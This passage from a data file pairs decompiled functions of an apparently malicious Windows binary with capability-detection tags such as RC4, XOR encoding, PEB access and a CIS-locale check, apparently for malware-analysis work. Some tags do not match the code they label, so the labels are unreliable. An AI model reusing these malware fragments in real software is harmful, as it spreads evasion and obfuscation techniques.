arg_ch[4];\n    uVar13 = iVar9;\n    uVar11 = uVar15 * 2;\n    arg_8h[8] = uVar11 + uVar13;\n    arg_8h[9] = ((((iVar1 * iVar2 >> 0x20) << 1 | uVar14 >> 0x1f) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar10, uVar12)) *\n                 2 | uVar15 >> 0x1f) + (iVar9 >> 0x20) + CARRY4(uVar11, uVar13);\n    uVar10 = arg_ch[2] * arg_ch[8];\n    uVar11 = arg_ch[4] * arg_ch[6];\n    uVar12 = uVar10 + uVar11;\n    uVar14 = *arg_ch * arg_ch[10];\n    uVar13 = uVar12 + uVar14;\n    arg_8h[0xb] = ((arg_ch[2] * arg_ch[8] >> 0x20) + (arg_ch[4] * arg_ch[6] >> 0x20) + CARRY4(uVar10, uVar11) +\n                   (*arg_ch * arg_ch[10] >> 0x20) + CARRY4(uVar12, uVar14)) * 2 | uVar13 >> 0x1f;\n    arg_8h[10] = uVar13 * 2;\n    uVar11 = arg_ch[2] * arg_ch[10];\n    uVar10 = uVar11 * 2;\n    uVar14 = arg_ch[4] * arg_ch[8];\n    uVar15 = uVar10 + uVar14;\n    iVar9 = arg_ch[6] * arg_ch[6];\n    uVar12 = iVar9;\n    uVar16 = uVar15 + uVar12;\n    uVar13 = *arg_ch * arg_ch[0xc];\n    uVar17 = uVar16 + uVar13;\n    arg_8h[0xd] = (((arg_ch[2] * arg_ch[10] >> 0x20) << 1 | uVar11 >> 0x1f) + (arg_ch[4] * arg_ch[8] >> 0x20) +\n                   CARRY4(uVar10, uVar14) + (iVar9 >> 0x20) + CARRY4(uVar15, uVar12) + (*arg_ch * arg_ch[0xc] >> 0x20) +\n                  CARRY4(uVar16, uVar13)) * 2 | uVar17 >> 0x1f;\n    arg_8h[0xc] = uVar17 * 2;\n    uVar10 = arg_ch[6] * arg_ch[8];\n    uVar11 = *arg_ch * arg_ch[0xe];\n    uVar13 = uVar10 + uVar11;\n    uVar14 = arg_ch[4] * arg_ch[10];\n    uVar15 = uVar13 + uVar14;\n    uVar12 = arg_ch[2] * arg_ch[0xc];\n    uVar16 = uVar15 + uVar12;\n    arg_8h[0xf] = ((arg_ch[6] * arg_ch[8] >> 0x20) + (*arg_ch * arg_ch[0xe] >> 0x20) + CARRY4(uVar10, uVar11) +\n                   (arg_ch[4] * arg_ch[10] >> 0x20) + CARRY4(uVar13, uVar14) + (arg_ch[2] * arg_ch[0xc] >> 0x20) +\n                  CARRY4(uVar15, uVar12)) * 2 | uVar16 >> 0x1f;\n    arg_8h[0xe] = uVar16 * 2;\n    iVar1 = arg_ch[2];\n    iVar2 = arg_ch[0xe];\n    uVar14 = iVar1 * iVar2;\n    iVar3 = arg_ch[6];\n    iVar4 = arg_ch[10];\n    uVar12 = iVar3 * iVar4;\n    uVar17 = uVar14 + uVar12;\n    iVar5 = *arg_ch;\n    iVar6 = arg_ch[0x10];\n    uVar13 = iVar5 * iVar6;\n    uVar10 = uVar17 * 2;\n    uVar18 = uVar10 + uVar13;\n    iVar7 = arg_ch[4];\n    iVar8 = arg_ch[0xc];\n    uVar15 = iVar7 * iVar8;\n    uVar19 = uVar18 + uVar15;\n    iVar9 = arg_ch[8] * arg_ch[8];\n    uVar16 = iVar9;\n    uVar11 = uVar19 * 2;\n    arg_8h[0x10] = uVar11 + uVar16;\n    arg_8h[0x11] = (((((iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar14, uVar12)) * 2 | uVar17 >> 0x1f)\n                     + (iVar5 * iVar6 >> 0x20) + CARRY4(uVar10, uVar13) + (iVar7 * iVar8 >> 0x20) +\n                    CARRY4(uVar18, uVar15)) * 2 | uVar19 >> 0x1f) + (iVar9 >> 0x20) + CARRY4(uVar11, uVar16);\n    uVar10 = arg_ch[8] * arg_ch[10];\n    uVar11 = arg_ch[4] * arg_ch[0xe];\n    uVar15 = uVar10 + uVar11;\n    uVar14 = arg_ch[2] * arg_ch[0x10];\n    uVar16 = uVar15 + uVar14;\n    uVar12 = arg_ch[6] * arg_ch[0xc];\n    uVar17 = uVar16 + uVar12;\n    uVar13 = *arg_ch * arg_ch[0x12];\n    uVar18 = uVar17 + uVar13;\n    arg_8h[0x13] = ((arg_ch[8] * arg_ch[10] >> 0x20) + (arg_ch[4] * arg_ch[0xe] >> 0x20) + CARRY4(uVar10, uVar11) +\n                    (arg_ch[2] * arg_ch[0x10] >> 0x20) + CARRY4(uVar15, uVar14) + (arg_ch[6] * arg_ch[0xc] >> 0x20) +\n                    CARRY4(uVar16, uVar12) + (*arg_ch * arg_ch[0x12] >> 0x20) + CARRY4(uVar17, uVar13)) * 2 |\n                   uVar18 >> 0x1f;\n    arg_8h[0x12] = uVar18 * 2;\n    uVar11 = arg_ch[6] * arg_ch[0xe];\n    uVar14 = arg_ch[2] * arg_ch[0x12];\n    uVar16 = uVar11 + uVar14;\n    uVar12 = arg_ch[8] * arg_ch[0xc];\n    uVar10 = uVar16 * 2;\n    uVar17 = uVar10 + uVar12;\n    uVar13 = arg_ch[4] * arg_ch[0x10];\n    uVar18 = uVar17 + uVar13;\n    iVar9 = arg_ch[10] * arg_ch[10];\n    uVar15 = iVar9;\n    uVar19 = uVar18 + uVar15;\n    arg_8h[0x15] = ((((arg_ch[6] * arg_ch[0xe] >> 0x20) + (arg_ch[2] * arg_ch[0x12] >> 0x20) + CARRY4(uVar11, uVar14)) *\n                     2 | uVar16 >> 0x1f) + (arg_ch[8] * arg_ch[0xc] >> 0x20) + CARRY4(uVar10, uVar12) +\n                    (arg_ch[4] * arg_ch[0x10] >> 0x20) + CARRY4(uVar17, uVar13) + (iVar9 >> 0x20) +\n                   CARRY4(uVar18, uVar15)) * 2 | uVar19 >> 0x1f;\n    arg_8h[0x14] = uVar19 * 2;\n    uVar10 = arg_ch[6] * arg_ch[0x10];\n    uVar11 = arg_ch[8] * arg_ch[0xe];\n    uVar13 = uVar10 + uVar11;\n    uVar14 = arg_ch[10] * arg_ch[0xc];\n    uVar15 = uVar13 + uVar14;\n    uVar12 = arg_ch[4] * arg_ch[0x12];\n    uVar16 = uVar15 + uVar12;\n    arg_8h[0x17] = ((arg_ch[6] * arg_ch[0x10] >> 0x20) + (arg_ch[8] * arg_ch[0xe] >> 0x20) + CARRY4(uVar10, uVar11) +\n                    (arg_ch[10] * arg_ch[0xc] >> 0x20) + CARRY4(uVar13, uVar14) + (arg_ch[4] * arg_ch[0x12] >> 0x20) +\n                   CARRY4(uVar15, uVar12)) * 2 | uVar16 >> 0x1f;\n    arg_8h[0x16] = uVar16 * 2;\n    iVar1 = arg_ch[10];\n    iVar2 = arg_ch[0xe];\n    uVar14 = iVar1 * iVar2;\n    iVar3 = arg_ch[6];\n    iVar4 = arg_ch[0x12];\n    uVar12 = iVar3 * iVar4;\n    uVar16 = uVar14 + uVar12;\n    iVar5 = arg_ch[8];\n    iVar6 = arg_ch[0x10];\n    uVar13 = iVar5 * iVar6;\n    uVar10 = uVar16 * 2;\n    uVar17 = uVar10 + uVar13;\n    iVar9 = arg_ch[0xc] * arg_ch[0xc];\n    uVar15 = iVar9;\n    uVar11 = uVar17 * 2;\n    arg_8h[0x18] = uVar11 + uVar15;\n    arg_8h[0x19] = (((((iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar14, uVar12)) * 2 | uVar16 >> 0x1f)\n                     + (iVar5 * iVar6 >> 0x20) + CARRY4(uVar10, uVar13)) * 2 | uVar17 >> 0x1f) + (iVar9 >> 0x20) +\n                   CARRY4(uVar11, uVar15);\n    uVar10 = arg_ch[8] * arg_ch[0x12];\n    uVar11 = arg_ch[10] * arg_ch[0x10];\n    uVar12 = uVar10 + uVar11;\n    uVar14 = arg_ch[0xc] * arg_ch[0xe];\n    uVar13 = uVar12 + uVar14;\n    arg_8h[0x1b] = ((arg_ch[8] * arg_ch[0x12] >> 0x20) + (arg_ch[10] * arg_ch[0x10] >> 0x20) + CARRY4(uVar10, uVar11) +\n                    (arg_ch[0xc] * arg_ch[0xe] >> 0x20) + CARRY4(uVar12, uVar14)) * 2 | uVar13 >> 0x1f;\n    arg_8h[0x1a] = uVar13 * 2;\n    uVar11 = arg_ch[10] * arg_ch[0x12];\n    iVar9 = arg_ch[0xe] * arg_ch[0xe];\n    uVar14 = iVar9;\n    uVar10 = uVar11 * 2;\n    uVar13 = uVar10 + uVar14;\n    uVar12 = arg_ch[0xc] * arg_ch[0x10];\n    uVar15 = uVar13 + uVar12;\n    arg_8h[0x1d] = (((arg_ch[10] * arg_ch[0x12] >> 0x20) << 1 | uVar11 >> 0x1f) + (iVar9 >> 0x20) +\n                    CARRY4(uVar10, uVar14) + (arg_ch[0xc] * arg_ch[0x10] >> 0x20) + CARRY4(uVar13, uVar12)) * 2 |\n                   uVar15 >> 0x1f;\n    arg_8h[0x1c] = uVar15 * 2;\n    uVar10 = arg_ch[0xc] * arg_ch[0x12];\n    uVar11 = arg_ch[0xe] * arg_ch[0x10];\n    uVar14 = uVar10 + uVar11;\n    arg_8h[0x1f] = ((arg_ch[0xc] * arg_ch[0x12] >> 0x20) + (arg_ch[0xe] * arg_ch[0x10] >> 0x20) + CARRY4(uVar10, uVar11)\n                   ) * 2 | uVar14 >> 0x1f;\n    arg_8h[0x1e] = uVar14 * 2;\n    iVar1 = arg_ch[0xe];\n    iVar2 = arg_ch[0x12];\n    uVar10 = iVar1 * iVar2;\n    iVar9 = arg_ch[0x10] * arg_ch[0x10];\n    uVar11 = iVar9;\n    uVar14 = uVar10 * 4;\n    arg_8h[0x20] = uVar14 + uVar11;\n    arg_8h[0x21] = ((iVar1 * iVar2 >> 0x20) << 2 | uVar10 >> 0x1e) + (iVar9 >> 0x20) + CARRY4(uVar14, uVar11);\n    uVar10 = arg_ch[0x10] * arg_ch[0x12];\n    arg_8h[0x23] = (arg_ch[0x10] * arg_ch[0x12] >> 0x20) << 1 | uVar10 >> 0x1f;\n    arg_8h[0x22] = uVar10 * 2;\n    iVar9 = arg_ch[0x12] * arg_ch[0x12];\n    uVar10 = iVar9;\n    arg_8h[0x25] = (iVar9 >> 0x20) << 1 | uVar10 >> 0x1f;\n    arg_8h[0x24] = uVar10 * 2;\n    return;\n}\n",
        "token_count": 4047
    },
    "0040cdc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cdc0(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    \n    if (0x1c < arg_ch) {\n        return 0xffffffff;\n    }\n    uVar1 = fcn.0040c0a6(arg_8h, arg_ch, arg_10h, arg_14h, 0x90, 6, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, \n                         arg_14h, in_stack_00000014, in_stack_00000018, in_stack_0000001c, in_stack_00000020, \n                         in_stack_00000024, in_stack_00000028, in_stack_0000002c, in_stack_00000030, in_stack_00000034, \n                         in_stack_00000038, in_stack_0000003c, in_stack_00000040, in_stack_00000044, in_stack_00000048, \n                         in_stack_0000004c, in_stack_00000050, in_stack_00000054, in_stack_00000058, in_stack_0000005c);\n    return uVar1;\n}\n",
        "token_count": 474
    },
    "0040cdeb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cdeb(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    \n    if (0x20 < arg_ch) {\n        return 0xffffffff;\n    }\n    uVar1 = fcn.0040c0a6(arg_8h, arg_ch, arg_10h, arg_14h, 0x88, 6, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, \n                         arg_14h, in_stack_00000014, in_stack_00000018, in_stack_0000001c, in_stack_00000020, \n                         in_stack_00000024, in_stack_00000028, in_stack_0000002c, in_stack_00000030, in_stack_00000034, \n                         in_stack_00000038, in_stack_0000003c, in_stack_00000040, in_stack_00000044, in_stack_00000048, \n                         in_stack_0000004c, in_stack_00000050, in_stack_00000054, in_stack_00000058, in_stack_0000005c);\n    return uVar1;\n}\n",
        "token_count": 473
    },
    "0040ce16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ce16(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    \n    if (0x30 < arg_ch) {\n        return 0xffffffff;\n    }\n    uVar1 = fcn.0040c0a6(arg_8h, arg_ch, arg_10h, arg_14h, 0x68, 6, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, \n                         arg_14h, in_stack_00000014, in_stack_00000018, in_stack_0000001c, in_stack_00000020, \n                         in_stack_00000024, in_stack_00000028, in_stack_0000002c, in_stack_00000030, in_stack_00000034, \n                         in_stack_00000038, in_stack_0000003c, in_stack_00000040, in_stack_00000044, in_stack_00000048, \n                         in_stack_0000004c, in_stack_00000050, in_stack_00000054, in_stack_00000058, in_stack_0000005c);\n    return uVar1;\n}\n",
        "token_count": 473
    },
    "0040ce3e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ce3e(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    \n    if (0x40 < arg_ch) {\n        return 0xffffffff;\n    }\n    uVar1 = fcn.0040c0a6(arg_8h, arg_ch, arg_10h, arg_14h, 0x48, 6, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, \n                         arg_14h, in_stack_00000014, in_stack_00000018, in_stack_0000001c, in_stack_00000020, \n                         in_stack_00000024, in_stack_00000028, in_stack_0000002c, in_stack_00000030, in_stack_00000034, \n                         in_stack_00000038, in_stack_0000003c, in_stack_00000040, in_stack_00000044, in_stack_00000048, \n                         in_stack_0000004c, in_stack_00000050, in_stack_00000054, in_stack_00000058, in_stack_0000005c);\n    return uVar1;\n}\n",
        "token_count": 474
    },
    "0040ce66": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ce66(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    \n    fcn.0040c0a6(arg_8h, arg_ch, arg_10h, arg_14h, 0xa8, 0x1f, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, \n                 arg_14h, in_stack_00000014, in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024\n                 , in_stack_00000028, in_stack_0000002c, in_stack_00000030, in_stack_00000034, in_stack_00000038, \n                 in_stack_0000003c, in_stack_00000040, in_stack_00000044, in_stack_00000048, in_stack_0000004c, \n                 in_stack_00000050, in_stack_00000054, in_stack_00000058, in_stack_0000005c);\n    return;\n}\n",
        "token_count": 442
    },
    "0040ce86": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ce86(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    \n    fcn.0040c0a6(arg_8h, arg_ch, arg_10h, arg_14h, 0x88, 0x1f, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, \n                 arg_14h, in_stack_00000014, in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024\n                 , in_stack_00000028, in_stack_0000002c, in_stack_00000030, in_stack_00000034, in_stack_00000038, \n                 in_stack_0000003c, in_stack_00000040, in_stack_00000044, in_stack_00000048, in_stack_0000004c, \n                 in_stack_00000050, in_stack_00000054, in_stack_00000058, in_stack_0000005c);\n    return;\n}\n",
        "token_count": 442
    },
    "0040dc27": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040dc27(int32_t arg_8h, int32_t **arg_ch, int32_t **arg_10h, int32_t **arg_14h, int32_t *arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    \n    if (*(arg_8h + 0x24) != 0) {\n        ppiVar3 = fcn.0040cf01(arg_8h, *(arg_8h + 0x20) + 0x18);\n        if (ppiVar3 == NULL) {\n            return 0;\n        }\n        if (*arg_10h == NULL) {\n            *arg_10h = ppiVar3;\n        }\n        ppiVar3[1] = arg_18h;\n        *ppiVar3 = *arg_ch;\n        if (*arg_14h != NULL) {\n            (*arg_14h)[4] = ppiVar3;\n        }\n        *arg_ch = ppiVar3;\n        *arg_14h = ppiVar3;\n        return 1;\n    }\n    piVar1 = *arg_14h;\n    *arg_ch = piVar1;\n    *arg_14h = (*arg_14h)[4];\n    if (*arg_10h == NULL) {\n        *arg_10h = piVar1;\n    }\n    iVar2 = piVar1[1];\n    if (iVar2 == 1) {\n        if (piVar1[2] == 0) {\n            return 1;\n        }\n        iVar4 = piVar1[2] * 0xc;\n        iVar2 = fcn.0040cf01(arg_8h, piVar1[3] + iVar4);\n        piVar1[3] = iVar2;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        piVar1[4] = iVar2 + iVar4;\n    }\n    else {\n        if (iVar2 == 2) {\n            if (piVar1[2] == 0) {\n                return 1;\n            }\n            iVar2 = piVar1[2] << 2;\n        }\n        else {\n            if (iVar2 != 5) {\n                return 1;\n            }\n            iVar2 = piVar1[2] + 1;\n        }\n        iVar2 = fcn.0040cf01(arg_8h, iVar2);\n        piVar1[3] = iVar2;\n        if (iVar2 == 0) {\n            return 0;\n        }\n    }\n    piVar1[2] = 0;\n    return 1;\n}\n",
        "token_count": 600
    },
    "0040deb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0040deb0(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    float fVar4;\n    float10 in_ST0;\n    uint32_t uStack32;\n    float fStack28;\n    \n    uVar1 = ROUND(in_ST0);\n    uStack32 = uVar1;\n    fStack28 = uVar1 >> 0x20;\n    fVar4 = in_ST0;\n    if ((uStack32 != 0) || (fVar4 = fStack28,  (uVar1 & 0x7fffffff00000000) != 0)) {\n        if (fVar4 < 0) {\n            uVar2 = 0x80000000 < (in_ST0 - uVar1 ^ 0x80000000);\n            bVar3 = CARRY4(uStack32, uVar2);\n            uStack32 = uStack32 + uVar2;\n            fStack28 = fStack28 + bVar3;\n        }\n        else {\n            uVar2 = 0x80000000 < in_ST0 - uVar1;\n            bVar3 = uStack32 < uVar2;\n            uStack32 = uStack32 - uVar2;\n            fStack28 = fStack28 - bVar3;\n        }\n    }\n    return CONCAT44(fStack28, uStack32);\n}\n",
        "token_count": 306
    },
    "004081e3": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004081e3(int32_t arg_8h)\n\n{\n    fcn.0040536d(*(arg_8h + 0x14));\n    fcn.004051e4(*(arg_8h + 0x18));\n    return;\n}\n",
        "token_count": 62
    },
    "004051f9": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004051f9(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        for (; (arg_10h = arg_10h + -1,  arg_10h != 0 && (*arg_8h == *arg_ch)); arg_8h = arg_8h + 1) {\n            arg_ch = arg_ch + 1;\n        }\n        return *arg_8h - *arg_ch;\n    }\n    return 0;\n}\n",
        "token_count": 132
    },
    "0040527b": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040527b(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_48h = 0x419;\n    var_44h = 0x422;\n    var_40h = 0x423;\n    var_3ch = 0x428;\n    var_38h = 0x42b;\n    var_34h = 0x42c;\n    var_30h = 0x437;\n    var_2ch = 0x43f;\n    var_28h = 0x440;\n    var_24h = 0x442;\n    var_20h = 0x443;\n    var_1ch = 0x444;\n    var_18h = 0x818;\n    var_14h = 0x819;\n    var_10h = 0x82c;\n    var_ch = 0x843;\n    var_8h = 0x45a;\n    var_4h = 0x2801;\n    uVar1 = (**0x413cd0)();\n    uVar2 = (**0x413dd8)();\n    uVar3 = 0;\n    while (((&var_48h)[uVar3] != (uVar1 & 0xffff) && ((&var_48h)[uVar3] != (uVar2 & 0xffff)))) {\n        uVar3 = uVar3 + 1;\n        if (0x11 < uVar3) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 480
    },
    "00406647": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406647(int32_t arg_8h, uint32_t arg_ch, char *arg_10h)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            *arg_10h = \"0123456789abcdef\"[*(uVar2 + arg_8h) >> 4];\n            puVar1 = uVar2 + arg_8h;\n            uVar2 = uVar2 + 1;\n            arg_10h[1] = \"0123456789abcdef\"[*puVar1 & 0xf];\n            arg_10h = arg_10h + 2;\n        } while (uVar2 < arg_ch);\n    }\n    return 1;\n}\n",
        "token_count": 183
    },
    "00405913": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nuint fcn.00405913(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    return *(in_FS_OFFSET + 0x30);\n}\n",
        "token_count": 33
    },
    "004077d3": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004077d3(uint8_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        arg_ch = arg_ch - arg_8h;\n        do {\n            *arg_8h = *arg_8h ^ arg_8h[arg_ch];\n            arg_8h = arg_8h + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "0040c061": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c061(int32_t arg_8h, uint32_t *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    arg_8h = arg_8h - arg_ch;\n    arg_14h = 10;\n    do {\n        uVar2 = (*arg_ch ^ *(arg_8h + arg_ch)) & -arg_10h;\n        uVar1 = *(arg_8h + arg_ch) ^ uVar2;\n        *(arg_8h + arg_ch) = uVar1;\n        *(arg_8h + 4 + arg_ch) = uVar1 >> 0x1f;\n        uVar2 = *arg_ch ^ uVar2;\n        arg_14h = arg_14h + -1;\n        *arg_ch = uVar2;\n        arg_ch[1] = uVar2 >> 0x1f;\n        arg_ch = arg_ch + 2;\n    } while (arg_14h != 0);\n    return;\n}\n",
        "token_count": 248
    },
    "00401434": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401434(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0;\n    var_10h = 0x421614;\n    var_ch = 0x421620;\n    uVar2 = 0;\n    var_8h = 0x42162c;\n    var_4h = 0x421638;\n    do {\n        fcn.004071bb((&var_10h)[uVar2]);\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 4);\n    fcn.00401fa6(0x421648);\n    fcn.00401fa6(0x421658);\n    var_54h = *0x4215d0;\n    var_50h = *0x4215d4;\n    var_4ch = *0x4215d8;\n    var_48h = *0x4215dc;\n    var_44h = *0x4215e0;\n    var_40h = *0x4215e4;\n    var_3ch = *0x4215e8;\n    var_38h = *0x4215ec;\n    var_34h = *0x4215f0;\n    var_30h = *0x4215f4;\n    var_2ch = *0x4215f8;\n    var_28h = *0x4215fc;\n    var_24h = *0x421600;\n    var_20h = *0x421604;\n    var_1ch = *0x421608;\n    var_18h = *0x42160c;\n    var_14h = *0x421610;\n    do {\n        if ((&var_54h)[uVar1] != 0) {\n            fcn.004051e4((&var_54h)[uVar1]);\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x11);\n    return;\n}\n",
        "token_count": 603
    },
    "0040279a": {
        "rules": [
            "contain loop"
        ],
